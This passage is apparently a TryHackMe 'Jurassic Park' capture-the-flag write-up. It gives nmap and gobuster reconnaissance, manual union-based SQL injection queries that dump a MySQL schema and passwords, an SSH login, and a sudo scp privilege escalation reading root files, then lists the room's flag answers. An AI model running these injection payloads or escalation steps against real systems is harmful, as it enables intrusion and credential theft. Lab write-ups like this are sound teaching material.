|     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
|     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
|     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
|     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
|     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
|     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
|     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
|     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
|     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
|     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
|     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
|     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
|     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
|     	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
|_    	MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	0.0	https://vulners.com/metasploit/MSF:EXPLOIT/UNIX/WEBAPP/JOOMLA_MEDIA_UPLOAD_EXEC/	*EXPLOIT*
| http-enum: 
|_  /robots.txt: Robots file
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/2%OT=22%CT=1%CU=42651%PV=Y%DS=4%DC=T%G=Y%TM=61FB4F78
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11
OS:NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 0.010 days (since Wed Feb  2 20:30:09 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   35.71 ms  10.13.0.1
2   ... 3
4   170.37 ms 10.10.105.134

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  2 20:43:52 2022 -- 1 IP address (1 host up) scanned in 915.75 seconds
```

SSH and Apache on port 80. Pretty standard. There is an enumerated `/robots.txt` file, which turns out to be invalid — it contains only the phrase "Wubbalubbadubdub".

Let's also hit the target with gobuster:

```bash
gobuster \
	-t 50 dir \
	-u http://10.10.105.134 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This reveals some interesting directories:

*  `/assets` is unsecured and contains site assets, and reveals that we're running Apache 2.4.18 on Ubuntu.
* `/delete` is a plain text file: "New pric esc for Ubuntu?? Change MySQL password on main system!"
* `/server-status` is forbidden (which is not surprising).

Out of curiosity, I tried loading `/item.php?id=robots.txt` to see if I could get file inclusion without ascending. This doesn't work, but throws another SQL error: "Unknown column 'robots.txt in 'where clause'". This indicates that we're definitely vulnerable to some kind of injection, since `robots.txt` is being treated as a column spec. In fact, this indicates that there must not be any quoting going on at all!

And indeed, trying `/item.php?id=0 or 1=1` brings up the same broken page as `/item.php?id=100`. So I think what's going on here is that `/item.php` is just doing some string filtering (it looks like it's probably also checking if you're trying to include a real file, as attempting to include non-existent files *doesn't* trigger it).

What the hell, let's throw SQLMap at it anyway!

```bash
sqlmap -u http://10.10.105.134/item.php?id=1 \
       --dbms=mysql --dump-all --batch
```

Well, that didn't work.

Meanwhile, futzing around by hand I find that `/item.php?id=0 union select null, null, null, null, null` works and displays a slightly *different* error page (so, whatever the `id` variable is being pushed into must be at the very end of the SQL statement). And, while "`'`" triggers the annoying error page, using a double quote ("`"`") does not.  Using a bit of trial-and error, we can determine that all but the first of these columns are usable, though the fourth place is easiest to read. This at least let's us figure out our first few flags.

FLAG 1: What is the SQL database called which is serving the shop information? — `park`

FLAG 2: How many columns does the table have? — `5`

FLAG 3: Whats the system *version*? — `Ubuntu 16.04`

The database also appears to be running as root. Ruh roh!

Now that we're getting the hang of this, we can extract more information by using queries of the form: `/item.php?id=0 union (select null, null, null, "something", null)`. I'm going to focus on the actual SQL inside of these parenthesis.

```sql
select null, null, null, count(*), null from mysql.user
```

We have four users. We can enumerate them by replacing `count(*)` with `User` and taking on a `limit` clause; this just reveals that the only users are `root` and three standard Debian system users that are used for upgrades and maintenance.

```sql
select null, null, null, count(*), null
from information_schema.tables
```

This reveals that there are 282 tables managed by this MySQL instance (ouch!). But how many tables are in the `park` database (which is what's serving up this site)?

```sql
select null, null, null, count(*), null
from information_schema.tables
where table_schema = "park"
```

Only two. That seems much better. I wonder what they are?

```sql
select null, null, null, table_name, null
from information_schema.tables
where table_schema = "park"
limit 0, 1
```

So we have two tables, `items` and `users`. Let's see what the columns of the `users` table are.

```sql
select null, null, null, column_name, null
from information_schema.columns
where table_schema = "park"
	and table_name = "users"
limit 0, 1
```

So, the columns are `id`, `username`, and `password`. Nice. Let's dig into that table.

```sql
select null, null, null, password, null
from park.users
limit 0, 1
```

Unfortunately, trying to include the `username` column triggers the annoying error, so all we can retrieve are two passwords, `D0nt3ATM3` and `ih8dinos`. Just for grins (and clued in by the structure of the flag questions), let's see if we can SSH into the box as either of these using the user `dennis`.

The second works for this purpose, and the first flag is right in `dennis`' home directory.

FLAG 4: What is dennis' password? — `ih8dinos`

FLAG 5: Locate and get the first flag contents. — `b89f2d69c56b9981ac92dd267f`

Poking around a bit, `sudo -l` reveals that `dennis` can use `scp` via `sudo`, and the `test.sh` file implies that there's a `/root/flag5.txt` file. Since `scp` works like `cp` for local copies, we can grab this.

```bash
sudo scp /root/flag5.txt .
cat flag5.txt
```

FLAG 8: Whats the contents of the fifth flag? — `2a7074e491fcacc7eeba97808dc5e2ec`

Continuing to poke around, `cat .bash_history` reveals the third flag (as well as a lot of `scp` attempts around `/root/flag5.txt`, which I just got).

FLAG 7: Whats the contents of the third flag? — `b4973bbc9053807856ec815db25fb3f1`

The `~/.viminfo` file reveals two more potential flags: `/boot/grub/fonts/flagTwo.txt` and `/tmp/flagFour.txt`.

FLAG 6: Whats the contents of the second flag? — `96ccd6b429be8c9a4b501c7a0b117b0a`

But, as the TryHackMe room notes, there is no fourth flag. So actually we're done.

* [Using "sqlmap"](../Notes/Using%20%22sqlmap%22.md)
* [SQL Injection](../Notes/SQL%20Injection.md)
* [Using "nmap"](../Notes/Using%20%22nmap%22.md)
* [Using "gobuster"](../Notes/Using%20%22gobuster%22.md)

ELAPSED TIME: 2 h 53 min

## References

* [TryHackMe: Jurassic Park](https://tryhackme.com/room/jurassicpark)
